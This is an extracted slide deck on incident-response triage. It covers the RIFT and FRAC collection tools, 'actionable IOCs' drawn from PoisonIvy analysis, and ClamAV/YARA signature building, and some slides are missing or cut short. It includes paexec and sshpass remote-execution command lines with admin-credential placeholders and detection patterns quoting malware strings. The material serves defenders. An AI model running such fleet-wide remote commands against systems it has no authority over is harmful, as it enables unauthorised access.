1. 1. Practical Incident Response in Heterogeneous Environment Keven Murphy & Stefano Maccaglia 1
2. 2. The mass-triage problem in 2018 • The investigation process (Triage), in any IT incident, is the key to solve the case and to clean all
the affected systems. • But in heterogeneous environments, where Windows, Linux, Mac OS, and Unix systems are potentially affected
by the attacker, the investigation process is slowed by a number of technical complexities. First problem is related to a common
platform and procedure to adopt for the triage as many technologies are capable of covering only a portion of the environment. Second
problem, what to look for, as the triage is aimed to identify malicious artifacts and usual technologies are not providing flexibility and
agility to shape the triage process. Third problem, the capability to search the heterogeneous environment using custom IOCs.
Fourth problem, the possibility to pinpoint known badness which allows for easier mitigation. • In our approach, the IOCs play an
important role both for the investigation process and the definition of the best way to approach the triage. We were looking to a “rule them
all” solution aimed to overcome traditional limitations of the most common commercial solutions. 2
3. 3. Traditional IOCs application • The traditional IR approach: • Context, in regard of IOCs, typically does not exists. • Application of IOCs
to the environment is rule-based • Customization of IOCs are not an option in some commercial products. • Rule-based detection will
miss changes made to the actor’s tools 3
4. 4. Our idea • The production of code leaves traces in any binary. • The binary can contain debugging symbols, which give you a lot of
information. • Often the attacker tools include the use of specific libraries or functions. • A lot of fingerprinting can be done with software,
an this is very useful for IR analyses. • The combined information of both can help to solve the attribution problem. • Helps with
assessment of risks • Identifying end goals for known actors • Aid the creation of IOCs that are “actionable” and not “disposable” 4
5. 5. RIFT (Retrieve Interesting Files Tool) ● Retrieves files/directories based on regex list ● Uses Sleuthkit to retrieve files forensically ●
Outputs files files into a directory (machine name) ● Retrieved files are saved remote share/USB ● Recreates the directory structure of
where the file was found ● To run: ● Download: rift --verbose --savedrive [SAVEDRIVE] https://github.com/chaoticmachinery/frac_rift 5
6. 6. Getfileslist.txt examples ● “getfileslist.txt” contains a regex list of files and directories that RIFT will retrieve 6 ntuser.dat$
system32/winevt/logs/ ^/etc/ .ssh
7. 7. FRAC (Forensic Response ACquisition) ● Uses RIFT to forensically retrieve files/directories across the network ● Recommend using
PAExec or SSH/SSHPASS to connect to remote machines ● Requires local admin rights and remote share (SMB/NFS depending on OS)
● Supports single IP, CIDR notation, and IP range like the following examples: ● Can be used to execute any command on remote
machines ● To run: –172.16.10.12 –172.16.10.1/24 –172.16.10.1-172.16.10.230 frac_v0.05 --iplist iplist.txt --cmd cmd.txt –verbose
paexec.exe [IP] -n 4 -u [ADMINID] -p [ADMINPASS] -s cmd /C "net use [SHAREDRV] /delete /yes & net use [SHAREDRV] [SHARE]
/user:[SHAREUSERID] [SHAREPASSWD] && cd /d [SAVEDRIVE] && rift.exe -- verbose --savedrive [SAVEDRIVE] && net use
[SHAREDRV] /delete /yes" sshpass -p [ADMINPASS] ssh [IP] "mkdir [SHAREDRV];mount [MNTOPTS] [SRCBOX]:[SRCMNT]
[SHAREDRV] ; cd [SHAREDRV]/frac_v0.05 && ./rift -- verbose --savedrive [SAVEDRIVE] ; cd / && umount [SHAREDRV] && rmdir
[SHAREDRV]" Examples of Cmd.Txt 7
8. 8. FRAC (Forensic Response Acquisition): The Output ● FRAC/RIFT creates directories with the hostname of the machine drwxr-xr-x 7

var Getfiles.txt Contains the mactime information for all of the files retrieved as well as the inode *fls.out Contains the fls.out (mactime)
output from the Sleuthkit FLS command. All of the directory structure is recreated and files are forensically copied to where they existed
on the drive. 8
9. 9. Actionable IOCs (AIOCs) • The concept of “actionable” IOCs has been derived and refined from a collective set of Incident Response
investigations, and could become a valid support of our investigative process if organized in a scientifically sound approach. • Utilizes
procedures, analysis, and evidence for a methodical approach • Based on positive matches can help identify the attacker • It allow the
creation of a structured knowledge base of attackers • The knowledge base allows the creation of attacker profiles 9
10. 10. Malware analysis process to build AIOCs 10
11. 11. Example: PoisonIvy • PoisonIvy, a Remote Access Tool/Trojan (RAT) often used in targeted attacks, had been widely seen until
around 2013. • Since then, the number of cases using PoisonIvy decreased, and there was no special variant with expanded features
seen in the wild. • However, recently, we identified PoisonIvy with expanded features in its communication function capable to bypass
HTTP/HTTPS proxy in APT and cybercriminal attacks thanks to modifications in the malware code. Latest PoisonIvy variants are
different 11

module. • The main module is responsible for providing the framework to execute the various components within the malware. • The
communication module is responsible for the sending of information to the server, receiving new commands from it and downloading of
new executable. • If a new executable is downloaded successfully, it will notifying the main module to execute it. • The malware is
capable of: • Listing and controlling processes • Creating and deleting files • Creating a remote shell • Downloading and executing files •

21. 21. Why ClamAV for AIOCs? 21
22. 22. 22 Clam AV: Intro • ClamAV is an open source and free anti-virus program. • ClamAV runs on Windows (ClamWin), Linux, BSD,
Solaris, and Mac OS X, and its mainly designed to scan email attachment, but it can be used as a regular anti- virus. • ClamAV includes:
• Features • Can search archives • Can search multiple file types • Multithreaded Clamscan Clamdscan/Clamd Freshclam
Command line virus scanner Client/Server virus scanner tool to update the virus definition database
23. 23. 23 YARA Rules, AIOCs and ClamAV • Yara is the swiss army knife for any low-cost triage and can be applied to many endpoint
forensic platforms. • Values that work across multiple platforms • Text strings • Hex values that are in multiple versions of the binary •
ClamAV provides combination of both worlds. • By empowering ClamAV with Yara rules, we are able to run massive triage on almost all
type of system using AIOCs we have developed.
24. 24. Using ClamAV to Scan for Badness clamscan --infected --recursive --allmatch –archive -verbose --database ./{yara sigs}.yara
{starting directory} | tee clamav_{date}_yara clamscan --infected --recursive --allmatch --archive-verbose --database ./{clamav sigs}.ldb

27. 27. Sigtool: ClamAV command line 27 Sigtool (signature and database management tool) Signature using the hash of the PE-section of
an executable Signature using full MD5 hash of file Signature using the a hex fragment of a file
28. 28. C:Documents and SettingsuserDesktop> sigtool --md5 malware.exe >> sigFile.hdb C:Documents and SettingsuserDesktop>type

malware.exe.text.dat >> sigFile.mdb • To create a unique signature for an executable file we use the --md5 option of sigtool, and then
save the output into a file with a “.hdb” extension. • To create a signature that will match a particular PE section (typically the sections are
labelled .text, .rdata, .data, .idata, etc.), use the “--mdb” option of sigtool and then save the output into a “.mdb” file. The easiest way to
generate MD5 based section signatures is to extract target PE sections into separate files. Sigtool: Command explained 28

C:Documents and SettingsuserDesktop> echo testSig:0:*:4920616d2061206d616c77617265200d0a >> sigFile.ndb • The last method is
to use Body-based signatures in an hexadecimal format. It relies on extracted strings from the body of the file. • In the next example we
create an hex dump of the string “I am malware”. • Next we save the signature that has the format called “Extended Signature”:
MalwareName:TargetType:Offset:HexSignature and redirect the output to a file “.ndb”. Sigtool: Command explained 29

33. 33. Remote ClamAV scan with FRAC FRAC can be used to scan the network. It tracks those IP addresses that cannot be connected
so that can be feed back to FRAC later for scanning. Remember to create a share with clam databases Might be able to scan more
25 boxes at a time. Do sensitive boxes by hand vs using FRAC. FRAC machine with ClamAV DB Scanned Host 1 Scanned Host 2

“CONNECT %s:%i HTTP//1.0” The first Rule contains two non-successive strings divided by the symbol “*”. The first string translated
from hexadecimal contains the word “%supdate%4d%02d%02d%02d%02d%02d.tmp”. This rule takes a Poison Ivy sample dated 2011
and we use 3 different strings. The first is “/c del %s > nul” The second strings is “GET %s HTTP/1.1” The last matches to “uuddosbea”
The third rule is the same sample mentioned above, but without the package UPX. The first of two strings is “vry7fo/URLDownez{” The
second strings is “6u%u.193.%d” 34

(0&2&3)|(4&5)|(6&7&8) This is a ClamAV “Body-based”, slightly different, from the previous one. It has to be put inside a “.LDB” file and it
is possible to use logic operators inside the rule. Logical operators in action within the BISONAL signature. Numbers are placeholders for
the hex strings. Match IF found: (both strings 0,1 and 2) OR (both strings 0,2 and 3) OR (only strings 4 and 5) OR (both strings 6,7 and

37. 37. • Actionable IOCs is an answer to the need of solid indicators to support the investigation, the attribution and the triage, of incidents
generated by malicious actors. • The adoption of this methodology can positively impact investigation and triage, but also improves
knowledge of the tools and strategies adopted by the adversaries. • The formalization process behind it can facilitate the exchange of
information and indicators without the risk of unintentional leakage of sensitive information and, in short, strengthen the proactive and
reactive capabilities of any structure. Where are we heading
